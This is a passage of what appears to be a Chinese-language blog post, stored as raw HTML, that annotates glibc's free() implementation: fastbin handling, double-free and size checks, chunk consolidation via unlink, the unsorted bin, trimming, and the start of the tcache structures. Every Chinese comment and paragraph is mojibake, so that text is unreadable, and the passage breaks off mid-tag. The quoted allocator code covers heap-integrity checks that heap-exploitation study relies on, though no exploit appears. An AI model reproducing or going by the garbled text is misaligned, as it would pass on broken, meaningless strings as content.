æŒ‡é’ˆä¸èƒ½æŒ‡å‘éæ³•çš„åœ°å€, å¿…é¡»å°äºç­‰äº-sizeï¼Œä¸ºä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿ</span><br>    <span class="hljs-comment">// æŒ‡é’ˆå¿…é¡»å¾—å¯¹é½ï¼Œ2*SIZE_SZ è¿™ä¸ªå¯¹é½</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect((<span class="hljs-keyword">uintptr_t</span>) p &gt; (<span class="hljs-keyword">uintptr_t</span>) -size, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(misaligned_chunk(p), <span class="hljs-number">0</span>)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>        <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);<br>        malloc_printerr(check_action, errstr, chunk2mem(p), av);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">       multiple of MALLOC_ALIGNMENT.  */</span><br>    <span class="hljs-comment">// å¤§å°æ²¡æœ‰æœ€å°çš„chunkå¤§ï¼Œæˆ–è€…è¯´ï¼Œå¤§å°ä¸æ˜¯MALLOC_ALIGNMENTçš„æ•´æ•°å€</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-comment">// æ£€æŸ¥è¯¥chunkæ˜¯å¦å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œéè°ƒè¯•çŠ¶æ€ä¸‹æ²¡æœ‰ä½œç”¨</span><br>    check_inuse_chunk(av, p);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br><br>    <span class="hljs-keyword">if</span> (tcache<br>&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>      &#123;<br>tcache_put (p, tc_idx);<br><span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p)                                                    \</span><br><span class="hljs-meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="hljs-meta">     MALLOC_ALIGN_MASK)</span><br></code></pre></div></td></tr></table></figure><h3 id="on-fastbin"><a href="#on-fastbin" class="headerlink" title="on fastbin"></a>on fastbin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">        and used quickly in malloc.</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast())<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> TRIM_FASTBINS</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">        bordering top into fastbins </span><br><span class="hljs-comment">        */</span><br>        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) <span class="hljs-comment">//è¿™ä¸ªå®æ˜¯åœ¨ifè¯­å¥é‡ŒåŠ ä¸Šä¸€æ¡,æ„ä¹‰æ˜¯pä¸å’Œtop chunkç›¸é‚»</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    )<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || <br>            __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        &#123;<br>            <span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">        of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">        after getting the lock.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock || (<br>                                &#123;<br>                                    assert(locked == <span class="hljs-number">0</span>);<br>                                    __libc_lock_lock(av-&gt;mutex);<br>                                    locked = <span class="hljs-number">1</span>;<br>                                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ || <br>                                    chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;<br>                                &#125;))<br>            &#123;<br>                errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!have_lock)<br>            &#123;<br>                __libc_lock_unlock(av-&gt;mutex);<br>                locked = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// å°†chunkçš„meméƒ¨åˆ†å…¨éƒ¨è®¾ç½®ä¸ºperturb_byte</span><br>        free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>        <span class="hljs-comment">// è®¾ç½®fast chunkçš„æ ‡è®°ä½</span><br>        set_fastchunks(av);<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx = fastbin_index(size);<br>        fb = &amp;fastbin(av, idx); <span class="hljs-comment">//å–å‡ºfastbinå¤´æŒ‡é’ˆ</span><br><br>        <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>        <span class="hljs-comment">//å¤šçº¿ç¨‹ç›¸å…³, è·³è¿‡</span><br>        mchunkptr old = *fb, old2;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> old_idx = ~<span class="hljs-number">0u</span>; <span class="hljs-comment">//ä¸å°±æ˜¯ 1 å—?</span><br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">        (i.e., double free).  */</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>            &#123; <span class="hljs-comment">//é˜²æ­¢å¯¹ fast bin double free</span><br>                errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">        size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">        only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">        deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>                old_idx = fastbin_index(chunksize(old));<br>            p-&gt;fd = old2 = old;<br>        &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);<br><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="hljs-number">0</span>))<br>        &#123;<br>            errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="åˆå¹¶é-mmap-çš„ç©ºé—²-chunk"><a href="#åˆå¹¶é-mmap-çš„ç©ºé—²-chunk" class="headerlink" title="åˆå¹¶é mmap çš„ç©ºé—² chunk"></a>åˆå¹¶é mmap çš„ç©ºé—² chunk</h3><p><strong>åªæœ‰ä¸æ˜¯ fast bin çš„æƒ…å†µä¸‹æ‰ä¼šè§¦å‘ unlink</strong> </p><p>é¦–å…ˆæˆ‘ä»¬å…ˆè¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šåˆå¹¶ chunkï¼Œè¿™æ˜¯ä¸ºäº†é¿å… heap ä¸­æœ‰å¤ªå¤šé›¶é›¶ç¢ç¢çš„å†…å­˜å—ï¼Œåˆå¹¶ä¹‹åå¯ä»¥ç”¨æ¥åº”å¯¹æ›´å¤§çš„å†…å­˜å—è¯·æ±‚ã€‚åˆå¹¶çš„ä¸»è¦é¡ºåºä¸º</p><ol><li>å…ˆè€ƒè™‘ç‰©ç†ä½åœ°å€ç©ºé—²å—</li><li>åè€ƒè™‘ç‰©ç†é«˜åœ°å€ç©ºé—²å—</li></ol><p><strong>åˆå¹¶åçš„ chunk æŒ‡å‘åˆå¹¶çš„ chunk çš„ä½åœ°å€ã€‚</strong> </p><p>åœ¨æ²¡æœ‰é”çš„æƒ…å†µä¸‹ï¼Œå…ˆè·å¾—é”ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>        __libc_lock_lock(av-&gt;mutex);<br>        locked = <span class="hljs-number">1</span>;<br>    &#125;<br>    nextchunk = chunk_at_offset(p, size);<br></code></pre></div></td></tr></table></figure><h4 id="è½»é‡çº§çš„æ£€æµ‹"><a href="#è½»é‡çº§çš„æ£€æµ‹" class="headerlink" title="è½»é‡çº§çš„æ£€æµ‹"></a>è½»é‡çº§çš„æ£€æµ‹</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">   top block.  */</span><br><span class="hljs-comment">// å½“å‰freeçš„chunkä¸èƒ½æ˜¯top chunk</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(p == av-&gt;top)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// å½“å‰freeçš„chunkçš„ä¸‹ä¸€ä¸ªchunkä¸èƒ½è¶…è¿‡arenaçš„è¾¹ç•Œ</span><br><span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br><span class="hljs-keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp;<br>                         (<span class="hljs-keyword">char</span> *) nextchunk &gt;=<br>                             ((<span class="hljs-keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)),<br>                     <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// å½“å‰è¦freeçš„chunkçš„ä½¿ç”¨æ ‡è®°æ²¡æœ‰è¢«æ ‡è®°ï¼Œdouble free</span><br><span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk))) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// ä¸‹ä¸€ä¸ªchunkçš„å¤§å°</span><br>nextsize = chunksize(nextchunk);<br><span class="hljs-comment">// next chunk size valid check</span><br><span class="hljs-comment">// åˆ¤æ–­ä¸‹ä¸€ä¸ªchunkçš„å¤§å°æ˜¯å¦ä¸å¤§äº2*SIZE_SZï¼Œæˆ–è€…</span><br><span class="hljs-comment">// nextsizeæ˜¯å¦å¤§äºç³»ç»Ÿå¯æä¾›çš„å†…å­˜</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>    __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="é‡Šæ”¾å¡«å……"><a href="#é‡Šæ”¾å¡«å……" class="headerlink" title="é‡Šæ”¾å¡«å……"></a>é‡Šæ”¾å¡«å……</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">      <span class="hljs-comment">//å°†æŒ‡é’ˆçš„meméƒ¨åˆ†å…¨éƒ¨è®¾ç½®ä¸ºperturb_byte        </span><br>free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br></code></pre></div></td></tr></table></figure><h4 id="åå‘åˆå¹¶-åˆå¹¶ä½åœ°å€-chunk"><a href="#åå‘åˆå¹¶-åˆå¹¶ä½åœ°å€-chunk" class="headerlink" title="åå‘åˆå¹¶ - åˆå¹¶ä½åœ°å€ chunk"></a>åå‘åˆå¹¶ - åˆå¹¶ä½åœ°å€ chunk</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/* consolidate backward */</span>        <br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;            <br>    prevsize = prev_size(p);            <br>    size += prevsize;            <br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));            <br>    unlink(av, p, bck, fwd);        <br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="å‰å‘åˆå¹¶-ä¸‹ä¸€å—ä¸æ˜¯-top-chunk-æ”¾å…¥unsorted"><a href="#å‰å‘åˆå¹¶-ä¸‹ä¸€å—ä¸æ˜¯-top-chunk-æ”¾å…¥unsorted" class="headerlink" title="å‰å‘åˆå¹¶ - ä¸‹ä¸€å—ä¸æ˜¯ top chunk, æ”¾å…¥unsorted"></a>å‰å‘åˆå¹¶ - ä¸‹ä¸€å—ä¸æ˜¯ top chunk, æ”¾å…¥unsorted</h4><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä¸‹ä¸€å—ä¸æ˜¯ top chunk ï¼Œåˆ™åˆå¹¶ï¼Œå¹¶å°†åˆå¹¶åçš„ chunk æ”¾å…¥åˆ° unsorted bin ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ªchunkä¸æ˜¯top chunk</span><br><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>    <span class="hljs-comment">/* get and clear inuse bit */</span><br>    <span class="hljs-comment">// è·å–ä¸‹ä¸€ä¸ª chunk çš„ä½¿ç”¨çŠ¶æ€</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>    <span class="hljs-comment">// å¦‚æœä¸åœ¨ä½¿ç”¨ï¼Œåˆå¹¶ï¼Œå¦åˆ™æ¸…ç©ºå½“å‰chunkçš„ä½¿ç”¨çŠ¶æ€ã€‚</span><br>    <span class="hljs-comment">/* consolidate forward */</span><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>        unlink(av, nextchunk, bck, fwd);<br>        size += nextsize;<br>    &#125; <span class="hljs-keyword">else</span><br>        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">  Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">  not placed into regular bins until after they have</span><br><span class="hljs-comment">  been given one chance to be used in malloc.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// æŠŠ chunk æ”¾åœ¨ unsorted chunk é“¾è¡¨çš„å¤´éƒ¨</span><br>    bck = unsorted_chunks(av);<br>    fwd = bck-&gt;fd;<br>    <span class="hljs-comment">// ç®€å•çš„æ£€æŸ¥</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    p-&gt;fd = fwd;<br>    p-&gt;bk = bck;<br>    <span class="hljs-comment">// å¦‚æœæ˜¯ large chunkï¼Œé‚£å°±è®¾ç½®nextsizeæŒ‡é’ˆå­—æ®µä¸ºNULLã€‚</span><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    bck-&gt;fd = p;<br>    fwd-&gt;bk = p;<br><br>    set_head(p, size | PREV_INUSE);<br>    set_foot(p, size);<br><br>    check_free_chunk(av, p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ä¸‹ä¸€å—æ˜¯-top-chunk-åˆå¹¶åˆ°-top-chunk"><a href="#ä¸‹ä¸€å—æ˜¯-top-chunk-åˆå¹¶åˆ°-top-chunk" class="headerlink" title="ä¸‹ä¸€å—æ˜¯ top chunk - åˆå¹¶åˆ° top chunk"></a>ä¸‹ä¸€å—æ˜¯ top chunk - åˆå¹¶åˆ° top chunk</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">  consolidate into top</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// å¦‚æœè¦é‡Šæ”¾çš„chunkçš„ä¸‹ä¸€ä¸ªchunkæ˜¯top chunkï¼Œé‚£å°±åˆå¹¶åˆ° top chunk</span><br><span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    <span class="hljs-comment">//åªç”¨äºDE<span class="hljs-doctag">BUG:</span></span><br>    check_chunk(av, p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="å‘ç³»ç»Ÿè¿”è¿˜å†…å­˜"><a href="#å‘ç³»ç»Ÿè¿”è¿˜å†…å­˜" class="headerlink" title="å‘ç³»ç»Ÿè¿”è¿˜å†…å­˜"></a>å‘ç³»ç»Ÿè¿”è¿˜å†…å­˜</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">          chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">          threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          Unless max_fast is 0, we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">          bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">          has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">          don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">          is reached.</span><br><span class="hljs-comment">        */</span><br>         <span class="hljs-comment">// å¦‚æœåˆå¹¶åçš„ chunk çš„å¤§å°å¤§äºFASTBIN_CONSOLIDATION_THRESHOLD</span><br>         <span class="hljs-comment">// (ä¸€èˆ¬åˆå¹¶åˆ° top chunk éƒ½ä¼šæ‰§è¡Œè¿™éƒ¨åˆ†ä»£ç )</span><br>         <span class="hljs-comment">// é‚£å°±å‘ç³»ç»Ÿè¿”è¿˜å†…å­˜</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>            <span class="hljs-comment">// å¦‚æœæœ‰ fast chunk å°±è¿›è¡Œåˆå¹¶</span><br>            <span class="hljs-keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);<br>            <span class="hljs-comment">// ä¸»åˆ†é…åŒº</span><br>            <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>                <span class="hljs-comment">// top chunk å¤§äºå½“å‰çš„æ”¶ç¼©é˜™å€¼</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (chunksize(av-&gt;top)) &gt;=<br>                    (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.trim_threshold))<br>                    systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>      <span class="hljs-comment">// éä¸»åˆ†é…åŒºï¼Œåˆ™ç›´æ¥æ”¶ç¼©heap</span></span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">                   large, because the corresponding heap might go away.  */</span><br>                heap_info *heap = heap_for_ptr(top(av));<br><br>                assert(heap-&gt;ar_ptr == av);<br>                heap_trim(heap, mp_.top_pad);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>            assert(locked);<br>            __libc_lock_unlock(av-&gt;mutex);<br>        &#125;<br></code></pre></div></td></tr></table></figure><h3 id="é‡Šæ”¾-mmap-çš„-chunk"><a href="#é‡Šæ”¾-mmap-çš„-chunk" class="headerlink" title="é‡Šæ”¾ mmap çš„ chunk"></a>é‡Šæ”¾ mmap çš„ chunk</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//  If the chunk was allocated via mmap, release via munmap().</span><br>    munmap_chunk(p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><h2 id="ä¸¤ä¸ªstruct"><a href="#ä¸¤ä¸ªstruct" class="headerlink" title="ä¸¤ä¸ªstruct"></a>ä¸¤ä¸ªstruct</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span 